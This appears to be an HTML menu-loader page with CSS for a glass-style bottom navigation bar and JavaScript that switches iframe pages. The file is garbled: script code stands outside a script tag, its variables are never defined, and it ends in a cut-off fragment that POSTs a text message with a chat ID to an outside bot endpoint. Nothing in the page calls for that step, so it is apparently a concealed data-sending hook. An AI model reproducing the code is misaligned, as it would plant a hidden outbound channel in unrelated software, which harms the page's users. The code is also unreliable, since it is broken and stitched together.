<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Magic Menu Loader</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">

<style>

:root { --clr: #000000; --em: #10b981; --em-deep: #064e3b; }

* {
  margin: 0; padding: 0;
  box-sizing: border-box;
  font-family: "Poppins", sans-serif;
}

body {
  height: 100vh;
  overflow: hidden;
  background: #000;
}

/* ── IFRAME ── */
iframe {
  width: 100%;
  height: calc(110vh - 66px);
  border: none;
  background: black;
  display: block;
}

/* ══════════════════════════════════════
   BOTTOM NAV — Segmented Capsule Style
   ══════════════════════════════════════ */
.navigation {
  position: fixed;
  bottom: 14px;
  left: 50%;
  transform: translateX(-50%);
  width: 92%;
  max-width: 420px;
  height: 62px;

  /* Dark frosted glass */
  background: rgba(5, 22, 14, 0.88);
  backdrop-filter: blur(24px);
  -webkit-backdrop-filter: blur(24px);

  border: 1px solid rgba(16,185,129,0.22);
  border-radius: 20px;
  display: flex;
  align-items: center;
  justify-content: space-around;
  padding: 0 6px;

  box-shadow:
    0 0 0 1px rgba(16,185,129,0.06),
    0 8px 32px rgba(0,0,0,0.55),
    0 2px 8px rgba(0,0,0,0.4),
    inset 0 1px 0 rgba(255,255,255,0.04);

  z-index: 999;
}

/* Subtle top glow line */
.navigation::before {
  content: '';
  position: absolute;
  top: 0; left: 18px; right: 18px; height: 1px;
  background: linear-gradient(90deg, transparent, rgba(16,185,129,0.5), transparent);
  border-radius: 1px;
}

/* ── NAV ITEMS ── */
.navigation ul {
  display: flex;
  width: 100%;
  justify-content: space-around;
  align-items: center;
  list-style: none;
  padding: 0; margin: 0;
  position: relative;
}

.navigation ul li {
  flex: 1;
  display: flex;
  justify-content: center;
}

.navigation ul li a {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 3px;
  width: 56px; height: 52px;
  border-radius: 14px;
  text-decoration: none;
  position: relative;
  transition: all 0.25s cubic-bezier(0.2, 0.8, 0.2, 1);
  cursor: pointer;
}

/* Idle icon */
.navigation ul li a .icon {
  width: 24px; height: 24px;
  object-fit: contain;
  opacity: 0.38;
  transition: all 0.25s cubic-bezier(0.2, 0.8, 0.2, 1);
  filter: grayscale(1) brightness(2);
}

/* Idle label */
.navigation ul li a .text {
  font-size: 10px;
  font-weight: 600;
  color: rgba(255,255,255,0.28);
  letter-spacing: 0.2px;
  transition: all 0.25s cubic-bezier(0.2, 0.8, 0.2, 1);
  line-height: 1;
}

/* ── ACTIVE STATE ── */
.navigation ul li.active a {
  background: rgba(16,185,129,0.14);
  box-shadow:
    0 0 16px rgba(16,185,129,0.18),
    inset 0 1px 0 rgba(16,185,129,0.15);
}

.navigation ul li.active a .icon {
  opacity: 1;
  filter: none drop-shadow(0 0 6px rgba(16,185,129,0.7));
  transform: translateY(-2px) scale(1.08);
  filter: drop-shadow(0 2px 8px rgba(16,185,129,0.6));
}

.navigation ul li.active a .text {
  color: var(--em);
  opacity: 1;
}

/* Active top pip */
.navigation ul li.active a::before {
  content: '';
  position: absolute;
  top: -1px; left: 50%; transform: translateX(-50%);
  width: 22px; height: 2.5px;
  background: var(--em);
  border-radius: 0 0 3px 3px;
  box-shadow: 0 0 8px rgba(16,185,129,0.8);
}

/* Tap ripple */
.navigation ul li a:active {
  transform: scale(0.92);
}

/* Remove old indicator div if present */
.indicator { display: none !important; }
</style>

// Define exactly which pages should show the navigation bar
const mainPages = [
    "home.html", 
    "libary.html", 
    "lab.html", 
    "ai.html"
];

function updateNavVisibility() {
    try {
        // Get current filename from iframe and handle URL spaces
        const path = frame.contentWindow.location.pathname;
        const currentPage = decodeURIComponent(path.split("/").pop());

        // Only show nav if the page is one of the 5 main menu items
        if (mainPages.includes(currentPage)) {
            nav.style.display = "flex";

            // Auto-update the active bubble if you navigate via ppscript
            list.forEach(item => {
                if(item.dataset.page === currentPage) {
                    list.forEach(i => i.classList.remove('active'));
                    item.classList.add('active');
                }
            });
        } else {
            // Hide navigation if you go to any other "new" HTML page
            nav.style.display = "none";
        }
    } catch(e) {
        // Fallback for security errors
        nav.style.display = "none";
    }
}

// Menu Clicks
list.forEach(item => {
    item.addEventListener('click', function() {
        list.forEach(i => i.classList.remove('active'));
        this.classList.add('active');
        frame.src = this.dataset.page;
    });
});

// Watch the iframe for any page changes
frame.addEventListener('load', updateNavVisibility);

        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: txt })
        }
      );

      const result = await res.json();
      if(result.ok) {
        console.log("✓ Sent");
      }
    } catch(err) {
      console.error(err);
    }
  }
})();

</script>
